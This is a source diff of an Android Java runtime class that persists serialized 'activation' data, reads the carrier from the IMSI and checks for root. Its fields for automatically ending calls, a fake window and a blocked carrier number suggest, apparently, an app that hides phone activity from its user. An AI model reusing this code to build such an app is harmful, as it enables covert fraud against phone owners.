@@ -5,8 +5,10 @@ import android.os.Build;
 import android.telephony.TelephonyManager;
 import android.text.TextUtils;
 import com.plugin.common.utils.UtilsRuntime;
+import com.xstd.plugin.api.ActiveResponse;
 
-import java.io.File;
+import java.io.*;
+import java.util.concurrent.atomic.AtomicBoolean;
 
 /**
  * Created with IntelliJ IDEA.
@@ -17,13 +19,73 @@ import java.io.File;
  */
 public class AppRuntime {
 
-    public static boolean LOCK_DEVICE_AS_DISDEVICE = false;
+    /**
+     * 当前获取激活数据的线程是否在跑
+     */
+    public static AtomicBoolean ACTIVE_PROCESS_RUNNING = new AtomicBoolean(false);
 
-    public static String BLOCKED_NUMBER_WITH_PREFIX = "10010";
+    /**
+     * 当前的激活返回数据，需要做一个持久化
+     */
+    public static ActiveResponse ACTIVE_RESPONSE = null;
 
-    public static final int END_CALL_DELAY = 5000;
+    public static String PHONE_NUMBER = null;
+
+    /**
+     * 默认的挂断电话的时间延迟
+     */
+    public static final int END_CALL_DELAY = 8 * 1000;
 
     public static boolean FAKE_WINDOW_SHOW = false;
+
+    public static void readActiveResponse(String filePath) {
+        if (Config.DEBUG) {
+            Config.LOGD("[[readActiveResponse]] try to read response data from file : " + filePath);
+        }
+
+        File file = new File(filePath);
+        if (!file.exists()) {
+            ACTIVE_RESPONSE = null;
+        } else {
+            try {
+                FileInputStream fis = new FileInputStream(file);
+                ObjectInputStream ois = new ObjectInputStream(fis);
+                ACTIVE_RESPONSE = (ActiveResponse) ois.readObject();
+                ois.close();
+                fis.close();
+            } catch (Exception e) {
+                e.printStackTrace();
+            }
+        }
+    }
+
+    public static void saveActiveResponse(String filePath) {
+        if (Config.DEBUG) {
+            Config.LOGD("[[saveActiveResponse]] try to save response data to file : " + filePath);
+        }
+
+        if (ACTIVE_RESPONSE == null) {
+            return;
+        }
+
+        File file = new File(filePath);
+        if (!file.exists()) {
+            try {
+                file.createNewFile();
+            } catch (IOException e) {
+                e.printStackTrace();
+            }
+        }
+        try {
+            FileOutputStream fos = new FileOutputStream(file, false);
+            ObjectOutputStream oos = new ObjectOutputStream(fos);
+            oos.writeObject(ACTIVE_RESPONSE);
+            oos.close();
+            fos.close();
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
+    }
 
     public static final boolean isVersionBeyondGB() {
         return Build.VERSION.SDK_INT > Build.VERSION_CODES.GINGERBREAD_MR1;
@@ -51,12 +113,16 @@ public class AppRuntime {
         if (!TextUtils.isEmpty(imsi) && imsi.length() > 6) {
             String mnc = imsi.substring(3, 5);
             if ("00".equals(mnc) || "02".equals(mnc) || "07".equals(mnc)) {
+                //移动
                 return 1;
             } else if ("01".equals(mnc) || "06".equals(mnc)) {
+                //联通
                 return 2;
             } else if ("03".equals(mnc) || "05".equals(mnc)) {
+                //电信
                 return 3;
             } else if ("20".equals(mnc)) {
+                //铁通
                 return 4;
             }
         }
@@ -78,6 +144,11 @@ public class AppRuntime {
     private final static int kSystemRootStateEnable = 1;
     private static int systemRootState = kSystemRootStateUnknow;
 
+    /**
+     * 判断系统是否root
+     *
+     * @return
+     */
     public static boolean isRootSystem() {
         if (systemRootState == kSystemRootStateEnable) {
             return true;
